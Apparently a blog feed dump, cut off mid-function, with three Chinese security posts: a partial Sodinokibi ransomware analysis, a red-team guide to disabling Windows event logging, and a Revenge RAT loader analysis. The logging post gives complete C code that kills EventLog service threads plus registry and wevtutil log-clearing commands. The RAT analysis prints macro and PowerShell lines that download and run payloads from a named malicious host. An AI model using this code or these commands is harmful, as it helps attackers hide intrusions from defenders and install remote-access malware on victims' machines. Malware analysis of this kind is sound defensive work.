alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;vulnhub的一个靶场&lt;br&gt;链接：&lt;a href=&quot;http://www.vulnhub.com/entry/hacksudo-aliens,676/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.vulnhub.com/entr</summary>
      
    
    
    
    
    <category term="靶场练习" scheme="http://422926799.github.io/tags/靶场练习/"/>
    
  </entry>
  
  <entry>
    <title>Sodinokibi勒索分析</title>
    <link href="http://422926799.github.io/posts/d188378a.html"/>
    <id>http://422926799.github.io/posts/d188378a.html</id>
    <published>2021-06-01T11:01:56.000Z</published>
    <updated>2021-06-01T11:14:28.874Z</updated>
    
    <content type="html"><![CDATA[<p><strong>ps:该文章并无完全分析出整个过程</strong><br>原样本分析链接：<a href="http://blog.nsfocus.net/revil-apt/" target="_blank" rel="noopener">http://blog.nsfocus.net/revil-apt/</a><br>样本下载地址：<a href="https://app.any.run/tasks/c6ea97fa-4ec4-4820-8280-5d1c8704b460/" target="_blank" rel="noopener">https://app.any.run/tasks/c6ea97fa-4ec4-4820-8280-5d1c8704b460/</a><br>该样本分析与参考链接分析过程不一样，那个链接应该是完全解密的。该勒索病毒<br>经过三断加密最后释放shellcode进行DLL加载调用</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>VT查杀结果<br><img src="https://z3.ax1x.com/2021/06/01/2ubDU0.png" alt=""></p><p>沙盒运行分析：<a href="https://app.any.run/tasks/9e9c51ad-cc20-4807-bace-41a9428b3681" target="_blank" rel="noopener">https://app.any.run/tasks/9e9c51ad-cc20-4807-bace-41a9428b3681</a></p><p>入口点分析:<br><img src="https://z3.ax1x.com/2021/06/01/2ub68U.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/01/2ubgv4.png" alt=""></p><p>释放MsMpEng.exe和Mpsvc.dll到TEMP目录</p><p>执行流程是：MsMpEng.exe加载Mpsvc.dll （白加黑）<br>调用的Mpsvc.dll的ServiceCrtMain函数<br><img src="https://z3.ax1x.com/2021/06/01/2ubRKJ.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/01/2ubfbR.png" alt=""></p><p>ServiceCrtMain函数<br><img src="https://z3.ax1x.com/2021/06/01/2ub5Ux.png" alt=""></p><p>sub_100011C0函数实现加载PE<br><img src="https://z3.ax1x.com/2021/06/01/2ubTPK.png" alt=""></p><p>跟踪VirtualProtect地址修改权限的地址，这里dump后是一段解密DLL加载的shellcode<br><img src="https://z3.ax1x.com/2021/06/01/2ub78O.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/01/2ubLKH.png" alt=""></p><p>Process Hacker dump运行一分钟后线程为RWX权限的内存保存，得到解密后的dll<br><img src="https://z3.ax1x.com/2021/06/01/2ubvVI.png" alt=""></p><p>修补PE头<br><img src="https://z3.ax1x.com/2021/06/01/2uqFMQ.png" alt=""></p><p>重构PE大小<br><img src="https://z3.ax1x.com/2021/06/01/2uqAqs.png" alt=""></p><p>最后调用dll实现勒索<br>第一段dump和运行时解密的dll加密度对比，左边是第一次dump的，右边是解密后的dll 还有加密（<br><img src="https://z3.ax1x.com/2021/06/01/2uqVZn.png" alt=""></p><h2 id="IOCS"><a href="#IOCS" class="headerlink" title="IOCS"></a>IOCS</h2><p>IOCS:<br>835f242dde220cc76ee5544119562268<br>7d1807850275485397ce2bb218eff159<br>8cc83221870dd07144e63df594c391d9</p><h2 id="知识总结"><a href="#知识总结" class="headerlink" title="知识总结"></a>知识总结</h2><ul><li>遇见内存加载dll或反射dll加载，或者更改区断权限为RWX，对VirtualProtect函数地址下断点，断下后copy VirtualProtect函数里的地址跳转过去。dump即可</li><li>反射加载:运行进程后，Process Hacker找到该进程内存线程权限为RWX，dump即可得到完全解密的内容</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.163.com/dy/article/FOB083490531I6Y1.html" target="_blank" rel="noopener">https://www.163.com/dy/article/FOB083490531I6Y1.html</a><br><a href="https://blog.csdn.net/slc1112/article/details/111089013" target="_blank" rel="noopener">https://blog.csdn.net/slc1112/article/details/111089013</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;ps:该文章并无完全分析出整个过程&lt;/strong&gt;&lt;br&gt;原样本分析链接：&lt;a href=&quot;http://blog.nsfocus.net/revil-apt/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://blog.nsf</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>停止windows日志记录研究</title>
    <link href="http://422926799.github.io/posts/c6ff3736.html"/>
    <id>http://422926799.github.io/posts/c6ff3736.html</id>
    <published>2021-05-18T04:09:39.000Z</published>
    <updated>2021-05-18T04:20:46.539Z</updated>
    
    <content type="html"><![CDATA[<h2 id="方法一-注册表修改永久停止日志记录"><a href="#方法一-注册表修改永久停止日志记录" class="headerlink" title="方法一:注册表修改永久停止日志记录"></a>方法一:注册表修改永久停止日志记录</h2><p>需要注销/重启</p><pre><code>reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MiniNt&quot;</code></pre><h2 id="方法二-停止记录日志记录的线程"><a href="#方法二-停止记录日志记录的线程" class="headerlink" title="方法二:停止记录日志记录的线程"></a>方法二:停止记录日志记录的线程</h2><p>思路:<br>tips:需要拥有SeDebugPrivilege权限，不然不能正确执行–&gt;使用powershell管理权限运行即可<br>1.遍历所有进程获取所有进程PID<br>2.获取所有进程名为svchost.exe的进程PID<br>3获取这些进程命令行存在LocalServiceNetworkRestricted字符串的PID<br>4.获取这个PID的所有线程(TID)，获取所有TID的服务名称。是eventlog/EventLog字符串服务名称杀掉线程</p><p>用到的API：<br>枚举所有进程:<br>CreateToolhelp32Snapshot<br>Process32First<br>Process32Next</p><p>x64获取指定进程块(PEB)/TEB信息:<br>ntdll.dll - NtQueryInformationProcess #获取进程块信息<br>ntdll.dll - NtQueryInformationThread #获取线程块信息</p><p>读取内存:<br>ReadProcessMemory</p><p>枚举所有线程:<br>CreateToolhelp32Snapshot<br>Thread32First<br>Thread32Next</p><blockquote><p>获取到进程号之后我们需要识别具体的服务线程，在windows vista之后的系统，具体的服务线程约定使用servicemain作为入口点，同时服务线程自身会带有一个等同于服务名的tag，这个tag可以帮我们识别这个线程是否是我们寻找的，在x64线程teb中0x1720偏移的位置存放着service tag的数字标识<br>我们可以那这个数字标识使用I_QueryTagInformation api查询到具体service tag内容。<br><img src="https://z3.ax1x.com/2021/05/18/gfZg2t.png" alt=""></p></blockquote><p><img src="https://z3.ax1x.com/2021/05/18/gfZs5d.png" alt=""></p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#include &lt;TlHelp32.h&gt;#include &lt;winternl.h&gt;#pragma comment(lib, &quot;ntdll.lib&quot;)char *exename = &quot;svchost.exe&quot;;typedef struct _CLIENT_ID {    HANDLE UniqueProcess;    HANDLE UniqueThread;} CLIENT_ID;typedef NTSTATUS(WINAPI* pNtQueryInformationThread)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG, PULONG);typedef struct _THREAD_BASIC_INFORMATION{    NTSTATUS    exitStatus;    PVOID       pTebBaseAddress;    CLIENT_ID   clientId;    KAFFINITY               AffinityMask;    int                        Priority;    int                        BasePriority;    int                        v;} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;typedef enum _SC_SERVICE_TAG_QUERY_TYPE{    ServiceNameFromTagInformation = 1,    ServiceNameReferencingModuleInformation,    ServiceNameTagMappingInformation,} SC_SERVICE_TAG_QUERY_TYPE, *PSC_SERVICE_TAG_QUERY_TYPE;typedef struct _SC_SERVICE_TAG_QUERY{    ULONG   processId;    ULONG   serviceTag;    ULONG   reserved;    PVOID   pBuffer;} SC_SERVICE_TAG_QUERY, *PSC_SERVICE_TAG_QUERY;typedef NTSTATUS(WINAPI *NtQueryInformationProcessFake)(HANDLE, DWORD, PVOID, ULONG, PULONG);typedef ULONG(WINAPI* pI_QueryTagInformation)(PVOID, SC_SERVICE_TAG_QUERY_TYPE, PSC_SERVICE_TAG_QUERY);#define errorlog(data) {printf(&quot;API Error:%s Code:%d\n&quot;,data,GetLastError());}void EnumProcess();void test(int);void checkeventlog(CHAR *, int);void EnumProcess() {    HANDLE hprocesseap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    if (INVALID_HANDLE_VALUE == hprocesseap) {        errorlog(&quot;Funcion EnumProcess---&gt;CreateToolhelp32Snapshot&quot;);    }    PROCESSENTRY32W pe;    pe.dwSize = sizeof(PROCESSENTRY32W);    BOOL getlist = Process32First(hprocesseap, &amp;pe);    while (getlist)    {        CHAR processname[100];        sprintf(processname, &quot;%ws&quot;, pe.szExeFile);        if (strcmp(exename, processname) == 0) {            test(pe.th32ProcessID);        }        getlist = Process32Next(hprocesseap, &amp;pe);    }}void test(int pid) {    HANDLE target = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);    PEB peb = { 0 };    PROCESS_BASIC_INFORMATION pbi = { 0 };    NtQueryInformationProcessFake NtQueryInformationProcess;    RTL_USER_PROCESS_PARAMETERS Param = { 0 };    int commandlength = 0;    NtQueryInformationProcess = (NtQueryInformationProcessFake)GetProcAddress(LoadLibrary(L&quot;ntdll.dll&quot;), &quot;NtQueryInformationProcess&quot;);    NtQueryInformationProcess(target, 0, (PVOID)&amp;pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);    ReadProcessMemory(target, pbi.PebBaseAddress, &amp;peb, sizeof(PEB), NULL);    ReadProcessMemory(target, peb.ProcessParameters, &amp;Param, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL);    WCHAR *buffer = new WCHAR[Param.CommandLine.Length + 1];    ZeroMemory(buffer, (Param.CommandLine.Length + 1) * sizeof(WCHAR));    ReadProcessMemory(target, Param.CommandLine.Buffer, buffer, Param.CommandLine.Length, NULL); //获取进程命令行    if (wcsstr(buffer, L&quot;LocalServiceNetworkRestricted&quot;)!=NULL) {        printf(&quot;PID:%d\n&quot;, pid);        checkeventlog(exename, pid);    }}void checkeventlog(CHAR *name, int pid) {    printf(&quot;%s %d\n&quot;, name, pid);    pNtQueryInformationThread NtQueryInformationThread = NULL;    pI_QueryTagInformation I_QueryTagInformation = NULL;    THREADENTRY32 te;    THREAD_BASIC_INFORMATION tbi = { 0 };    SC_SERVICE_TAG_QUERY tagQuery = { 0 };    te.dwSize = sizeof(THREADENTRY32);    HANDLE hTag = NULL;    NtQueryInformationThread = (pNtQueryInformationThread)GetProcAddress(GetModuleHandle(L&quot;ntdll.dll&quot;), &quot;NtQueryInformationThread&quot;);    I_QueryTagInformation = (pI_QueryTagInformation)GetProcAddress(LoadLibrary(L&quot;advapi32.dll&quot;), &quot;I_QueryTagInformation&quot;);    HANDLE threads = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);    if (INVALID_HANDLE_VALUE == threads) {        errorlog(&quot;checkeventlog---&gt;CreateToolhelp32Snapshot&quot;);    }    BOOL getlist = Thread32First(threads, &amp;te);    while (getlist) {        if (te.th32OwnerProcessID == pid) {            HANDLE hthread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);            NtQueryInformationThread(hthread, (THREAD_INFORMATION_CLASS)0, &amp;tbi, 0x30, NULL);            HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, te.th32OwnerProcessID);            ReadProcessMemory(hprocess, ((PBYTE)tbi.pTebBaseAddress + 0x1720), &amp;hTag, sizeof(HANDLE), NULL);            tagQuery.processId = te.th32OwnerProcessID;            tagQuery.serviceTag = (ULONG)hTag;            I_QueryTagInformation(NULL, ServiceNameFromTagInformation, &amp;tagQuery); //获取线程的服务名称            CHAR servicename[MAX_PATH] = { 0 };            sprintf(servicename, &quot;%ws&quot;, tagQuery.pBuffer);            if (strcmp(servicename, &quot;EventLog&quot;)==0) {                printf(&quot;Kill %d %s\n&quot;, te.th32ThreadID, servicename);                TerminateThread(hthread, 0);            }            else if (strcmp(servicename, &quot;eventlog&quot;)==0) {                printf(&quot;Kill %d %s\n&quot;, te.th32ThreadID, servicename);                TerminateThread(hthread, 0);            }            tagQuery = { 0 }; //重置线程数组，不然只有一个线程的信息一直刷一样的 -作为一个例子记得写入笔记 (        }        getlist = Thread32Next(threads, &amp;te);    }}int main(){    EnumProcess();    system(&quot;pause&quot;);    return 0;}</code></pre><p>Windows7测试:<br><img src="https://z3.ax1x.com/2021/05/18/gfZYCR.png" alt=""></p><p>Windows10测试:<br><img src="https://z3.ax1x.com/2021/05/18/gfZWKf.png" alt=""></p><p>清除windows日志<br>(清除所有日志，但是将生成一个事件ID为1102的日志，用于清除日志)</p><pre><code>wevtutil cl Systemwevtutil cl Applicationwevtutil cl Securitywevtutil cl Setup</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://idiotc4t.com/defense-evasion/fuck-eventlog" target="_blank" rel="noopener">https://idiotc4t.com/defense-evasion/fuck-eventlog</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;方法一-注册表修改永久停止日志记录&quot;&gt;&lt;a href=&quot;#方法一-注册表修改永久停止日志记录&quot; class=&quot;headerlink&quot; title=&quot;方法一:注册表修改永久停止日志记录&quot;&gt;&lt;/a&gt;方法一:注册表修改永久停止日志记录&lt;/h2&gt;&lt;p&gt;需要注销/重启&lt;/p</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>Revenge RAT加载器分析(word远程模板加载)</title>
    <link href="http://422926799.github.io/posts/ac1cf40.html"/>
    <id>http://422926799.github.io/posts/ac1cf40.html</id>
    <published>2021-05-15T08:27:48.000Z</published>
    <updated>2021-05-15T08:42:36.121Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接：<a href="https://www.uptycs.com/blog/revenge-rat-targeting-users-in-south-america" target="_blank" rel="noopener">https://www.uptycs.com/blog/revenge-rat-targeting-users-in-south-america</a><br>VT查杀<br><img src="https://z3.ax1x.com/2021/05/15/g6Qjoj.png" alt=""></p><h2 id="初始文件"><a href="#初始文件" class="headerlink" title="初始文件"></a>初始文件</h2><p><img src="https://z3.ax1x.com/2021/05/15/g6Q7SP.png" alt=""></p><p>方式:office vba远程模板加载<br><img src="https://z3.ax1x.com/2021/05/15/g6QzYn.png" alt=""></p><p>随机加载<a href="http://azulviagens.online/1-9.docx将下载并执行其中一个模板。" target="_blank" rel="noopener">http://azulviagens.online/1-9.docx将下载并执行其中一个模板。</a><br>每个文件都具有相同的内容（相同的SHA-256：338b2d8d76f4028bfbd177127371b2509971606553d606c534316dc40cfa8fb9）<br><img src="https://z3.ax1x.com/2021/05/15/g6lClV.png" alt=""></p><h2 id="模板文件"><a href="#模板文件" class="headerlink" title="模板文件"></a>模板文件</h2><blockquote><p>模板文件（“ 1.docx” …“ 9x.docx”）遵循图4（如下所示）所示的结构。结构中的settings.xml具有指向XLSM文件的“目标”字段，该字段位于DOCX文件结构的“嵌入”目录中。XLSM文件“ Microsoft_Excel_Macro-Enabled_Worksheet.xlsm”到“ Microsoft_Excel_Macro-Enabled_Worksheet9.xlsm”具有相同的内容（相同的SHA-256：32f1a502126b1932e1def04b98d8be235c8d25ef7268f8cb35d460cd073a88b2）。当Microsoft Word执行模板文件（“ 1.docx” …“ 9x.docx”）时，它将执行XLSM文件之一（“ Microsoft_Excel_Macro-Enabled_Worksheet.xlsm”到“ Microsoft_Excel_Macro-Enabled_Worksheet9.xlsm”）<br><img src="https://z3.ax1x.com/2021/05/15/g6ltfI.png" alt=""></p></blockquote><p>docx模板中的XLSM文件<br><img src="https://z3.ax1x.com/2021/05/15/g6la1P.png" alt=""></p><p>word/embeddings目录下任意一个xlsm文件<br><img src="https://z3.ax1x.com/2021/05/15/g6lykj.png" alt=""></p><h2 id="xlsm文件"><a href="#xlsm文件" class="headerlink" title="xlsm文件"></a>xlsm文件</h2><p>该结构在“ VBAProject.bin”文件中包含宏。以下屏幕快照显示了包含宏的流。olevba提取宏</p><pre><code>Dim Program As String, TaskID As DoubleProgram = UserForm1.Image1.ControlTipText + UserForm1.Frame1.Tag + UserForm1.TabStrip1.ControlTipText + UserForm1.ScrollBar1.TagProgram01 = UserForm2.Image1.Tag + UserForm2.Frame1.ControlTipTextOn Error Resume Next        AppActivate &quot;UserForm1&quot;If Err &lt;&gt; 0 Then                Err = 0TaskID = Shell(Program, 0) //PowerShell  -ex Bypass -nOp -w 1 iex(iwr(&#39;http://azulviagens.online/A.txt&#39;))TaskID01 = Shell(Program01, 0) //taskkill  /f /im WINWORD.EXE            If Err &lt;&gt; 0 Then MsgBox &quot;Can&#39;t start &quot; &amp; ProgramEnd IfEnd Sub</code></pre><p><img src="https://z3.ax1x.com/2021/05/15/g6lXjK.png" alt=""></p><p>UserForm1.Image1.ControlTipText olevba没看到，由于是shell函数执行的程序。火绒剑监控得到运行的内容<br><img src="https://z3.ax1x.com/2021/05/15/g6lvnO.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/05/15/g6lzHe.png" alt=""><br>(调用powershell远程下载执行)</p><p><img src="https://z3.ax1x.com/2021/05/15/g61C4A.png" alt=""><br>(杀掉进程WINWORD.exe)</p><p><code>http://azulviagens.online/A.txt</code>在复现的时候已经失效了，根据原文章的图如下</p><pre><code class="vbs">$ProcName=&quot;index.vbs&quot;$WebFile=&quot;http://azulviagens.online/index.mp3&quot;C&#39;l&#39;e&#39;a&#39;r&#39;-&#39;H&#39;o&#39;s&#39;t&#39;(N&#39;e&#39;W-&#39;O&#39;b&#39;j&#39;e&#39;c&#39;t&#39; S&#39;y&#39;s&#39;t&#39;e&#39;m&#39;.&#39;N&#39;e&#39;t&#39;.&#39;W&#39;e&#39;b&#39;C&#39;l&#39;ient).DownloadFile($WebFile,&quot;$env:APPDATA\$ProcName&quot;) #保存在C:\Users\&lt;Username&gt;\AppData\Roaming\index.vbsS&#39;t&#39;a&#39;r&#39;t&#39;-&#39;P&#39;r&#39;o&#39;c&#39;e&#39;s&#39;s (&quot;$env:APPDATA\$ProcName&quot;) #运行C:\Users\&lt;Username&gt;\AppData\Roaming\index.vbs</code></pre><p>最后运行index.vbs然后index.vbs远程下载/1.txt保存在Opera.vbs然后运行Opera.vbs<br><img src="https://z3.ax1x.com/2021/05/15/g61a59.png" alt=""></p><p>最后是远程下载Opera.ps1并执行，ps1内容如下<br>重度混淆（<br><img src="https://z3.ax1x.com/2021/05/15/g61081.png" alt=""></p><p>经过手动解密混淆，过程如下</p><pre><code># Decode 1$a=iex  (  [CHar]36+[CHar]101  +[CHar]107+[CHar]108+[CHar]116+  [CHar]107+[CHar]116+  [CHar]101  +[CHar]107  +[CHar]100  +  [CHar]107+[CHar]113+  [CHar]106  +  [CHar]102+[CHar]100+[CHar]107  +[CHar]102  +  [CHar]100+[CHar]107+[CHar]102  +[CHar]107  +  [CHar]100  +[CHar]102+[CHar]107  +[CHar]115+  [CHar]100  +[CHar]107+  [CHar]115  +  [CHar]100  +[CHar]107+  [CHar]118  +  [CHar]99  +[CHar]107  +[CHar]107+  [CHar]101  +  [CHar]114  +[CHar]107+[CHar]101  +  [CHar]119  +  [CHar]116  +  [CHar]101  +  [CHar]107+  [CHar]114  +  [CHar]116+  [CHar]101+[CHar]107  +[CHar]121  +  [CHar]101  +  [CHar]107  +  [CHar]119  +[CHar]48  +[CHar]48  +  [CHar]48+  [CHar]48+  [CHar]61+[CHar]45+[CHar]74  +[CHar]111+  [CHar]105+  [CHar]110  +  [CHar]32+  [CHar]40  +[CHar]40+[CHar]49+  [CHar]49  +[CHar]49+[CHar]44  +  [CHar]32  +[CHar]49+[CHar]48+[CHar]53+  [CHar]44+[CHar]32+[CHar]49  +[CHar]51+  [CHar]48+  [CHar]41+  [CHar]124+  [CHar]32  +[CHar]70+[CHar]111+[CHar]114  +[CHar]69+  [CHar]97  +  [CHar]99  +  [CHar]104  +[CHar]45+[CHar]79+  [CHar]98+  [CHar]106+[CHar]101+[CHar]99  +  [CHar]116  +[CHar]32  +[CHar]123  +[CHar]40+[CHar]32+[CHar]91  +  [CHar]67  +[CHar]111+  [CHar]110+[CHar]118+  [CHar]101+[CHar]114+  [CHar]116  +[CHar]93+[CHar]58  +[CHar]58+  [CHar]84  +  [CHar]111+  [CHar]73  +  [CHar]110+  [CHar]116+[CHar]49+  [CHar]54  +[CHar]40  +[CHar]40+[CHar]91  +  [CHar]83+[CHar]116+  [CHar]114  +  [CHar]105+  [CHar]110  +  [CHar]103+[CHar]93+  [CHar]36+  [CHar]95+[CHar]32  +  [CHar]41+  [CHar]44  +  [CHar]32  +  [CHar]56+  [CHar]41+[CHar]32+[CHar]45+[CHar]65  +  [CHar]115+  [CHar]91+[CHar]67  +[CHar]104  +  [CHar]97  +[CHar]114+[CHar]93+[CHar]41+  [CHar]125  +[CHar]41  +[CHar]59  +[CHar]115+[CHar]97  +  [CHar]108+[CHar]32+  [CHar]103  +  [CHar]32+  [CHar]36  +[CHar]101  +  [CHar]107  +[CHar]108+  [CHar]116+  [CHar]107+[CHar]116+[CHar]101  +  [CHar]107  +[CHar]100  +[CHar]107  +  [CHar]113  +[CHar]106+  [CHar]102  +  [CHar]100+[CHar]107  +[CHar]102  +[CHar]100+[CHar]107+[CHar]102+[CHar]107  +[CHar]100  +  [CHar]102  +[CHar]107+  [CHar]115  +  [CHar]100+  [CHar]107  +[CHar]115+  [CHar]100+  [CHar]107  +  [CHar]118  +  [CHar]99  +[CHar]107  +  [CHar]107  +[CHar]101  +  [CHar]114  +  [CHar]107+  [CHar]101+  [CHar]119+  [CHar]116+[CHar]101+  [CHar]107  +  [CHar]114  +  [CHar]116+  [CHar]101  +[CHar]107  +[CHar]121  +[CHar]101  +  [CHar]107  +  [CHar]119+[CHar]48  +[CHar]48+  [CHar]48+[CHar]48  )# Decode 2$ekltktekdkqjfdkfdkfkdfksdksdkvckkerkewtekrtekyekw0000=-Join ((111, 105, 130)| ForEach-Object {( [Convert]::ToInt16(([String]$_ ), 8) -As[Char])});sal g $ekltktekdkqjfdkfdkfkdfksdksdkvckkerkewtekrtekyekw0000 #sal为set-alias变量缩写# Decode 3iex(  [CHar]70+  [CHar]117  +  [CHar]110  +  [CHar]99+  [CHar]116+  [CHar]105  +  [CHar]111+  [CHar]110  +  [CHar]32  +  [CHar]109+  [CHar]97+  [CHar]120+[CHar]100  +[CHar]111+[CHar]111  +[CHar]111  +[CHar]109  +[CHar]32+  [CHar]123+[CHar]13  +[CHar]10+[CHar]32+  [CHar]13+  [CHar]10  +[CHar]32  +[CHar]32+  [CHar]32+[CHar]32  +  [CHar]91  +  [CHar]67+  [CHar]109  +[CHar]100+[CHar]108+  [CHar]101  +  [CHar]116+[CHar]66+[CHar]105+  [CHar]110  +[CHar]100  +[CHar]105+  [CHar]110  +  [CHar]103  +  [CHar]40  +[CHar]41  +  [CHar]93+  [CHar]13  +  [CHar]10  +[CHar]32+  [CHar]32  +  [CHar]32  +  [CHar]32  +[CHar]91  +[CHar]79  +[CHar]117  +[CHar]116+  [CHar]112  +[CHar]117  +[CHar]116  +  [CHar]84+  [CHar]121+  [CHar]112+[CHar]101+  [CHar]40+  [CHar]91  +[CHar]98+  [CHar]121  +  [CHar]116+[CHar]101+[CHar]91  +  [CHar]93+[CHar]93  +[CHar]41+  [CHar]93  +[CHar]13  +  [CHar]10+  [CHar]32+  [CHar]32+  [CHar]32  +  [CHar]32  +[CHar]112+[CHar]97  +[CHar]114  +[CHar]97  +[CHar]109  +[CHar]40  +  [CHar]13  +  [CHar]10  +  [CHar]32+  [CHar]32+  [CHar]32+  [CHar]32+[CHar]32  +[CHar]32+[CHar]32  +[CHar]32  +  [CHar]91  +  [CHar]80+[CHar]97+  [CHar]114  +  [CHar]97  +[CHar]109+[CHar]101+  [CHar]116  +[CHar]101  +  [CHar]114+  [CHar]40+[CHar]77+  [CHar]97  +[CHar]110  +[CHar]100+  [CHar]97+[CHar]116  +[CHar]111  +  [CHar]114  +[CHar]121  +[CHar]61+[CHar]36+  [CHar]116+  [CHar]114+[CHar]117+[CHar]101  +  [CHar]41+[CHar]93  +[CHar]32  +  [CHar]91+  [CHar]83  +  [CHar]116  +[CHar]114+[CHar]105  +[CHar]110+[CHar]103  +  [CHar]93+  [CHar]36+[CHar]122+  [CHar]88+[CHar]97+[CHar]87  +  [CHar]86  +  [CHar]80+[CHar]105+  [CHar]13  +[CHar]10  +  [CHar]32  +  [CHar]32  +  [CHar]32+  [CHar]32+  [CHar]41+[CHar]13  +[CHar]10  +[CHar]32+[CHar]32  +  [CHar]32+[CHar]32  +[CHar]36+[CHar]72+[CHar]116  +[CHar]116+[CHar]108  +[CHar]100+  [CHar]120  +[CHar]120  +  [CHar]49+  [CHar]115+  [CHar]49+  [CHar]115  +[CHar]51  +  [CHar]100+  [CHar]52  +  [CHar]102  +  [CHar]53+[CHar]118+  [CHar]53  +  [CHar]32  +  [CHar]61+[CHar]32  +  [CHar]78  +  [CHar]101  +[CHar]119  +[CHar]45+  [CHar]79  +  [CHar]98  +  [CHar]106  +[CHar]101  +  [CHar]99  +[CHar]116+  [CHar]32+[CHar]45+[CHar]84+  [CHar]121  +[CHar]112  +  [CHar]101  +  [CHar]78  +  [CHar]97+[CHar]109+  [CHar]101+  [CHar]32  +[CHar]98+[CHar]121+[CHar]116+[CHar]101+[CHar]91+[CHar]93  +  [CHar]32  +[CHar]45  +  [CHar]65  +[CHar]114+  [CHar]103+[CHar]117+  [CHar]109  +  [CHar]101+[CHar]110  +  [CHar]116+[CHar]76  +[CHar]105+[CHar]115+[CHar]116  +[CHar]32+[CHar]40  +  [CHar]36  +[CHar]122  +[CHar]88+  [CHar]97  +  [CHar]87+[CHar]86+  [CHar]80+  [CHar]105+  [CHar]46  +[CHar]76  +  [CHar]101+[CHar]110+  [CHar]103  +[CHar]116+  [CHar]104  +  [CHar]32  +[CHar]47  +  [CHar]32+  [CHar]50+  [CHar]41  +  [CHar]13  +  [CHar]10+  [CHar]32  +[CHar]32+[CHar]32  +[CHar]32+  [CHar]102+  [CHar]111  +  [CHar]114  +[CHar]32+  [CHar]40+[CHar]36  +[CHar]105  +[CHar]32  +  [CHar]61  +[CHar]32  +  [CHar]48  +  [CHar]59  +[CHar]32+  [CHar]36  +  [CHar]105  +[CHar]32+  [CHar]45+[CHar]108+[CHar]116  +[CHar]32  +  [CHar]36+[CHar]122+  [CHar]88  +  [CHar]97  +  [CHar]87+  [CHar]86+  [CHar]80  +  [CHar]105+  [CHar]46  +[CHar]76  +  [CHar]101  +[CHar]110  +[CHar]103  +[CHar]116  +[CHar]104+[CHar]59+  [CHar]32+  [CHar]36+  [CHar]105+  [CHar]32+[CHar]43  +[CHar]61+[CHar]32  +[CHar]50  +  [CHar]41  +[CHar]32+[CHar]123+  [CHar]13  +[CHar]10+  [CHar]32  +  [CHar]32+[CHar]32+[CHar]32  +[CHar]32  +[CHar]32  +  [CHar]32  +  [CHar]32  +[CHar]36  +  [CHar]72+[CHar]116+[CHar]116  +[CHar]108+  [CHar]100+  [CHar]120+  [CHar]120  +[CHar]49+  [CHar]115+  [CHar]49  +[CHar]115+  [CHar]51  +  [CHar]100+  [CHar]52+[CHar]102  +[CHar]53+  [CHar]118+[CHar]53  +  [CHar]91+[CHar]36  +  [CHar]105+  [CHar]32+  [CHar]47  +[CHar]32+[CHar]50  +[CHar]93  +[CHar]32+  [CHar]61+[CHar]32+[CHar]91  +[CHar]67+  [CHar]111+  [CHar]110  +[CHar]118  +  [CHar]101+[CHar]114+[CHar]116+[CHar]93  +  [CHar]58+[CHar]58  +  [CHar]84  +  [CHar]111  +[CHar]66+[CHar]121  +[CHar]116+[CHar]101+[CHar]40+  [CHar]36  +  [CHar]122  +  [CHar]88  +[CHar]97  +[CHar]87+  [CHar]86  +  [CHar]80+[CHar]105+[CHar]46  +  [CHar]83+  [CHar]117  +  [CHar]98  +[CHar]115  +[CHar]116  +  [CHar]114+  [CHar]105  +[CHar]110  +[CHar]103  +  [CHar]40+  [CHar]36  +  [CHar]105  +[CHar]44+  [CHar]32  +[CHar]50+  [CHar]41+[CHar]44  +[CHar]32  +  [CHar]49  +[CHar]54  +[CHar]41+  [CHar]13  +[CHar]10  +[CHar]32  +  [CHar]32+[CHar]32+[CHar]32  +  [CHar]125  +[CHar]13+  [CHar]10  +  [CHar]13+  [CHar]10+  [CHar]32  +  [CHar]32+[CHar]32  +[CHar]32  +[CHar]114  +  [CHar]101  +[CHar]116+  [CHar]117+[CHar]114+  [CHar]110+[CHar]32+  [CHar]91+  [CHar]98+  [CHar]121  +[CHar]116+  [CHar]101+[CHar]91  +[CHar]93+  [CHar]93  +  [CHar]36+[CHar]72+[CHar]116  +  [CHar]116+  [CHar]108+[CHar]100+[CHar]120  +[CHar]120+[CHar]49+  [CHar]115+  [CHar]49  +[CHar]115+[CHar]51+  [CHar]100+  [CHar]52+  [CHar]102+  [CHar]53+  [CHar]118+  [CHar]53+[CHar]13  +[CHar]10  +  [CHar]125  )# Decode 4Function maxdooom {    [CmdletBinding()]    [OutputType([byte[]])]    param(        [Parameter(Mandatory=$true)] [String]$zXaWVPi    )    $Httldxx1s1s3d4f5v5 = New-Object -TypeName byte[] -ArgumentList ($zXaWVPi.Length / 2)    for ($i = 0; $i -lt $zXaWVPi.Length; $i += 2) {        $Httldxx1s1s3d4f5v5[$i / 2] = [Convert]::ToByte($zXaWVPi.Substring($i, 2), 16)    }    return 